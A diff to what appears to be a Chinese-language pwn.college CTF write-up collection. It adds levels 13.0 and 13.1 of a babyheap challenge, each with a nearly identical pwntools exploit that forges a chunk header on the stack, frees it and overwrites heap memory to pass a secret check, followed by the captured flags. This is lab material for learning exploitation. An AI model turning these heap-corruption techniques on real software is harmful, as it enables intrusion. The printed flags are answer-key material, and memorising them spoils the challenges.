@@ -2715,7 +2715,7 @@ if __name__ == "__main__":
 
 ## Write-up
 
-参见 [Level 12.1](#level-121)。
+参见 [Level 12.0](#level-120)。
 
 ## Exploit
 
@@ -2830,3 +2830,241 @@ if __name__ == "__main__":
 ## Flag
 
 :sopiler[`pwn.college{wIhhQLe35f_W9wFoYZAeO6TJPGe.0FN5MDL5cTNxgzW}`]
+
+# Level 13.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage calling free() on a stack pointer to read secret data.
+
+## Write-up
+
+~我们迎来了最简单的一集。~
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level13.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode())
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x401,
+    )
+
+    stack_scanf(payload)
+    stack_free()
+    # raw_input("DEBUG")
+    malloc(0, 0x3F0)
+
+    payload = flat(
+        b"A" * (0xB0),
+    )
+    raw_input("DEBUG")
+    scanf(0, payload)
+
+    send_flag("A" * 0x10)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{Yz7oh0MVsBoSFEkrl1pl76sH5l0.0VN5MDL5cTNxgzW}`]
+
+# Level 13.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage calling free() on a stack pointer to read secret data.
+
+## Write-up
+
+参见 [Level 13.0](#level-130)。
+
+~_有时候我真的觉得自己在增加碳排放，但是我不想删了全改了，先将就沿袭一下传统吧，下次一定修改风格，下次一定（_~
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level13.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode())
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x401,
+    )
+
+    stack_scanf(payload)
+    stack_free()
+    # raw_input("DEBUG")
+    malloc(0, 0x3F0)
+
+    payload = flat(
+        b"A" * (0xB0),
+    )
+    raw_input("DEBUG")
+    scanf(0, payload)
+
+    send_flag("A" * 0x10)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{AzMm2HpvBwKXfmMU3AoN5SEUd4H.0lN5MDL5cTNxgzW}`]
